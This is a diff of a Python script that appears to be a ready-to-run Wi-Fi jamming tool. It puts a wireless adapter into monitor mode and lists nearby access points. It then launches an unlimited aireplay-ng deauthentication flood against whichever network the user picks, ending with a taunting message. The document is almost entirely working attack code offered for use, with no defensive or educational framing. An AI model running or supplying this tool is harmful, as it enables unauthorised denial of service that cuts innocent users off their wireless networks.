@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+
 import subprocess
 import re
 import csv
@@ -6,6 +7,7 @@ import os
 import time
 import shutil
 from datetime import datetime
+
 W = '\033[0m'
 R = '\033[31m' 
 G = '\033[32m' 
@@ -14,15 +16,21 @@ B = '\033[34m'
 P = '\033[35m' 
 C = '\033[36m' 
 GR = '\033[37m'
+
 active_wireless_networks = []
+
 def check_for_essid(essid, lst):
     check_status = True
+
     if len(lst) == 0:
         return check_status
+
     for item in lst:
         if essid in item["ESSID"]:
             check_status = False
+
     return check_status
+
 print(R + """ .S     S.    .S    sSSs   .S       S.     sSSs   .S    S.   
 .SS     SS.  .SS   d%%SP  .SS       SS.   d%%SP  .SS    SS.  
 S%S     S%S  S%S  d%S'    S%S       S%S  d%S'    S%S    S&S  
@@ -37,9 +45,11 @@ S*S_sSs_S*S  S*S  S*S      SSSbs_sdSSS    SSSbs  S*S     S&
 SSS~SSS~S*S  S*S  S*S       YSSP~YSSY      YSSP  S*S     SS  
              SP   SP                             SP          
              Y    Y                              Y        """ + W)
+
 if not 'SUDO_UID' in os.environ.keys():
     print(R + "[+] Error - " + O + "Use sudo." + W)
     exit()
+
 for file_name in os.listdir():
     if ".csv" in file_name:
         print(O + "[+] - Moving existing .csv file in the current directory to the backup folder." + W)
@@ -50,27 +60,37 @@ for file_name in os.listdir():
             print(GR + "[+] - Backup folder exists." + W)
         timestamp = datetime.now()
         shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+
 wlan_pattern = re.compile("^wlan[0-9]+")
+
 check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+
 if len(check_wifi_result) == 0:
     print(R + "[+] Error - " + O + "No wireless adapter found." + W)
     exit()
-print(B + "[+] - Wireless adapter available. " + W)
+
+print(B + "[+] - Wireless adapter available. \n" + W)
 for index, item in enumerate(check_wifi_result):
     print(C + f"{index}" + B +"-" + C + f"{item}" + W)
+
 while True:
-    wifi_interface_choice = input(B + "[+] - Select adapter : " + W)
+    wifi_interface_choice = input(B + "\n[+] - Select adapter : " + W)
     try:
         if check_wifi_result[int(wifi_interface_choice)]:
             break
     except:
         print(B + "[+] - Select an access point index : " + W)
+
 hacknic = check_wifi_result[int(wifi_interface_choice)]
+
 print(P + "[+] - Killing interface opened process." + W)
-kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+subprocess.run(["ip", "link", "set", hacknic, "down"])
+subprocess.run(["airmon-ng", "check", "kill"])
 print(P + "[+] - Enable monitor mode." + W)
-put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.run(["iw", hacknic, "set", "monitor", "none"])
+subprocess.run(["ip", "link", "set", hacknic, "up"])
+
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 try:
     while True:
         subprocess.call("clear", shell=True)
@@ -92,10 +112,12 @@ try:
         print(B + "No |\tBSSID              |\tChannel|\tESSID                         |" + W)
         print(B + "___|\t___________________|\t_______|\t______________________________|" + W)
         for index, item in enumerate(active_wireless_networks):
-            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+            print(P + f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}" + W)
         time.sleep(1)
+
 except KeyboardInterrupt:
     print(B + "\n[+] - Stoping scan." + W)
+
 while True:
     choice = input(B + "[+] - Select access point : " + W)
     try:
@@ -103,7 +125,12 @@ while True:
             break
     except:
         print(O + "[+] - Try again." + W)
+
 hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
-subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
+subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
+try:
+    print(R)
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
+except KeyboardInterrupt:
+    print(G + "[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
